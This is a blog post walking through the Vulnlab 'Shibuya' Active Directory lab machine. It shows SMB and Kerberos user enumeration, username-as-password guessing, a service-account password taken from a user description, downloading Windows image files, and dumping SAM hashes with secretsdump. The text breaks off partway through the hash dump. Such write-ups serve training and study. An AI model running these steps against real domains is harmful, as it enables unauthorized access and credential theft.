<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Shibuya - Vulnlab | serioton</title><meta name="author" content="serioton"><meta name="copyright" content="serioton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="active directory, cross-session relay, esc1">
<meta property="og:type" content="article">
<meta property="og:title" content="Shibuya - Vulnlab">
<meta property="og:url" content="https://seriotonctf.github.io/2025/04/07/Shibuya-Vulnlab/index.html">
<meta property="og:site_name" content="serioton">
<meta property="og:description" content="active directory, cross-session relay, esc1">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://assets.vulnlab.com/shibuya_slide.png">
<meta property="article:published_time" content="2025-04-07T22:25:48.000Z">
<meta property="article:modified_time" content="2025-04-08T15:24:48.915Z">
<meta property="article:author" content="serioton">
<meta property="article:tag" content="ctf,writeups,vulnlab,hackthebox,htb,thm,cheatsheet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://assets.vulnlab.com/shibuya_slide.png"><link rel="shortcut icon" href="/img/iconcat.png"><link rel="canonical" href="https://seriotonctf.github.io/2025/04/07/Shibuya-Vulnlab/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Shibuya - Vulnlab',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-04-08 15:24:48'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/camille-sule-bg-loulou-frames-00.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="serioton"><img class="site-icon" src="/img/cat.jpg"/><span class="site-name">serioton</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Shibuya - Vulnlab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2025-04-07T22:25:48.000Z" title="Created 2025-04-07 22:25:48">2025-04-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/">writeups</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Shibuya is a medium-difficulty Active Directory machine on VulnLab, created by xct. It involves user enumeration, SMB shares, cross-session relay attack, and ESC1</p>
<h1 id="User"><a href="#User" class="headerlink" title="User"></a>User</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.106.81 --generate-hosts-file hosts</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">$ cat hosts</span><br><span class="line">10.10.106.81     AWSJPDC0522.shibuya.vl shibuya.vl AWSJPDC0522</span><br></pre></td></tr></table></figure>
<h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">22/tcp   open  ssh</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">464/tcp  open  kpasswd5</span><br><span class="line">593/tcp  open  http-rpc-epmap</span><br><span class="line">3268/tcp open  globalcatLDAP</span><br><span class="line">3269/tcp open  globalcatLDAPssl</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br></pre></td></tr></table></figure>
<p>From the Nmap scan, we can see that we’re dealing with a Domain Controller, as it has DNS and Kerberos services running. Additionally, SSH is open, which is unusual</p>
<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>We can try listing shares using null authentication and guest authentication, but in this case, both failed</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.106.81 -u &#x27;&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [+] shibuya.vl\:</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [-] Error enumerating shares: STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.106.81 -u &#x27;a&#x27; -p &#x27;&#x27; --shares</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [-] shibuya.vl\a: STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>
<p>We don’t have any valid credentials either, so let’s try to enumerate users using kerbrute with the xato-net-10-million-usernames wordlist</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ~/tools/kerbrute userenum -d shibuya.vl --dc AWSJPDC0522.shibuya.vl /opt/seclists/Usernames/xato-net-10-million-usernames.txt -o users.txt</span><br><span class="line"></span><br><span class="line">    __             __               __</span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____</span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/</span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 04/07/25 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2025/04/07 19:34:31 &gt;  Using KDC(s):</span><br><span class="line">2025/04/07 19:34:31 &gt;   AWSJPDC0522.shibuya.vl:88</span><br><span class="line"></span><br><span class="line">2025/04/07 19:34:32 &gt;  [+] VALID USERNAME:       purple@shibuya.vl</span><br><span class="line">2025/04/07 19:34:34 &gt;  [+] VALID USERNAME:       red@shibuya.vl</span><br></pre></td></tr></table></figure>
<p>In this case, we got two users: purple and red (this is a Jujutsu Kaisen reference, just like the name of the machine)<br>We don’t have a password yet, but we can try using the username as the password, sometimes this works</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb shibuya.vl -u red -p red</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [-] shibuya.vl\red:red STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>
<p>Using NTLM authentication doesn’t work; however, when we add <code>-k</code> to authenticate using Kerberos, it works</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb shibuya.vl -u red -p red -k</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red</span><br></pre></td></tr></table></figure>
<p>Awesome! Now that we have valid credentials, we can enumerate further. Running <code>--shares</code> to look for SMB shares, we notice two non-standard shares called <code>users</code> and <code>images$</code>, but we only have read access to the <code>users</code> share</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb shibuya.vl -u red -p red -k --shares</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      [*] Enumerated shares</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      Share           Permissions     Remark</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      -----           -----------     ------</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      ADMIN$                          Remote Admin</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      C$                              Default share</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      images$</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      IPC$            READ            Remote IPC</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      NETLOGON        READ            Logon server share</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      SYSVOL          READ            Logon server share</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      users           READ</span><br></pre></td></tr></table></figure>
<p>Let’s get a ticket and connect to the users share using smbclient from impacket</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ getTGT.py shibuya.vl/red:red</span><br><span class="line">Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Saving ticket in red.ccache</span><br><span class="line">$ export KRB5CCNAME=red.ccache</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient.py -k -no-pass awsjpdc0522.shibuya.vl</span><br><span class="line">Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Type help for list of commands</span><br><span class="line"># shares</span><br><span class="line">ADMIN$</span><br><span class="line">C$</span><br><span class="line">images$</span><br><span class="line">IPC$</span><br><span class="line">NETLOGON</span><br><span class="line">SYSVOL</span><br><span class="line">users</span><br><span class="line"># use users</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Sun Feb 16 11:50:59 2025 .</span><br><span class="line">drw-rw-rw-          0  Wed Feb 19 13:59:37 2025 ..</span><br><span class="line">drw-rw-rw-          0  Sat Feb 15 07:49:31 2025 Administrator</span><br><span class="line">drw-rw-rw-          0  Sat Feb 15 16:48:20 2025 All Users</span><br><span class="line">drw-rw-rw-          0  Sat Feb 15 16:49:12 2025 Default</span><br><span class="line">drw-rw-rw-          0  Sat Feb 15 16:48:20 2025 Default User</span><br><span class="line">-rw-rw-rw-        174  Sat Feb 15 16:46:52 2025 desktop.ini</span><br><span class="line">drw-rw-rw-          0  Tue Feb 18 20:29:42 2025 nigel.mills</span><br><span class="line">drw-rw-rw-          0  Sat Feb 15 07:49:31 2025 Public</span><br><span class="line">drw-rw-rw-          0  Tue Feb 18 20:36:45 2025 simon.watson</span><br></pre></td></tr></table></figure>
<p>As you can see, we have more users that we can add to our users file. We can also try accessing each folder, but in this case, we get a permission denied</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># cd simon.watson</span><br><span class="line">[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - &#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.</span><br><span class="line"># cd nigel.mills</span><br><span class="line">[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - &#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.</span><br></pre></td></tr></table></figure>
<p>Let’s also enumerate more domain users using the <code>--users</code> flag in NetExec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb shibuya.vl -u red -p red -k --users</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      [+] shibuya.vl\red:red</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      -Username-                    -Last PW Set-       -BadPW- -Description-</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      _admin                        2025-02-15 07:55:29 0       Built-in account for administering the computer/domain</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      krbtgt                        2025-02-15 07:24:57 0       Key Distribution Center Service Account</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      svc_autojoin                  2025-02-15 07:51:49 0       &lt;REDACTED&gt;</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      Leon.Warren                   2025-02-16 10:23:34 0</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      Graeme.Kerr                   2025-02-16 10:23:34 0</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      Joshua.North                  2025-02-16 10:23:34 0</span><br><span class="line">SMB         shibuya.vl      445    AWSJPDC0522      Shaun.Burton                  2025-02-16 10:23:34 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>In this case, we get a lot of users, but one of them stands out, <code>svc_autojoin</code> has what looks like a password in his description</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb shibuya.vl -u svc_autojoin -p &#x27;K5&amp;A6Dw9d8jrKWhV&#x27;</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
<p>We can check if this user can access the <code>images$</code> share we saw earlier, and indeed, he can</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb shibuya.vl -u svc_autojoin -p &#x27;K5&amp;A6Dw9d8jrKWhV&#x27; --shares</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [+] shibuya.vl\svc_autojoin:&lt;REDACTED&gt;</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [*] Enumerated shares</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      Share           Permissions     Remark</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      -----           -----------     ------</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      C$                              Default share</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      images$         READ</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      NETLOGON        READ            Logon server share</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      SYSVOL          READ            Logon server share</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      users           READ</span><br></pre></td></tr></table></figure>
<p>After connecting and listing the files, we see some <code>.wim</code> files, which stand for Windows Imaging Format. It’s a disk image file format that contains a snapshot of a Windows installation</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient.py svc_autojoin@shibuya.vl</span><br><span class="line">Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">Type help for list of commands</span><br><span class="line"># use images$</span><br><span class="line"># ls</span><br><span class="line">drw-rw-rw-          0  Wed Feb 19 18:35:20 2025 .</span><br><span class="line">drw-rw-rw-          0  Wed Feb 19 13:59:37 2025 ..</span><br><span class="line">-rw-rw-rw-    8264070  Wed Feb 19 18:35:20 2025 AWSJPWK0222-01.wim</span><br><span class="line">-rw-rw-rw-   50660968  Wed Feb 19 18:35:20 2025 AWSJPWK0222-02.wim</span><br><span class="line">-rw-rw-rw-   32065850  Wed Feb 19 18:35:20 2025 AWSJPWK0222-03.wim</span><br><span class="line">-rw-rw-rw-     365686  Wed Feb 19 18:35:20 2025 vss-meta.cab</span><br></pre></td></tr></table></figure>
<p>Let’s download them to our local machine and take a look</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># get AWSJPWK0222-01.wim</span><br><span class="line"># get AWSJPWK0222-02.wim</span><br><span class="line"># get AWSJPWK0222-03.wim</span><br><span class="line"># get vss-meta.cab</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ file *.wim</span><br><span class="line">AWSJPWK0222-01.wim: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup</span><br><span class="line">AWSJPWK0222-02.wim: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup</span><br><span class="line">AWSJPWK0222-03.wim: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup</span><br></pre></td></tr></table></figure>
<p>We can mount those files, but a simpler way is to run 7z on them to extract the contents</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ 7z x AWSJPWK0222-01.wim</span><br><span class="line">$ ls</span><br><span class="line"> Administrator  &#x27;All Users&#x27;   Default  &#x27;Default User&#x27;   desktop.ini   Public   simon.watson</span><br></pre></td></tr></table></figure>
<p>We have the home directories of Administrator and simon.watson, but there’s nothing interesting there. Let’s move on to the second WIM file and repeat the same process we used on the first one. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls SAM SYSTEM SECURITY</span><br><span class="line">SAM  SECURITY  SYSTEM</span><br></pre></td></tr></table></figure>
<p>Nice! There are the SAM, SYSTEM, and SECURITY hives. Let’s dump them using secretsdump from impacket</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -system SYSTEM -sam SAM -security SECURITY local</span><br><span class="line">Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::</span><br><span class="line">operator:1000:aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span 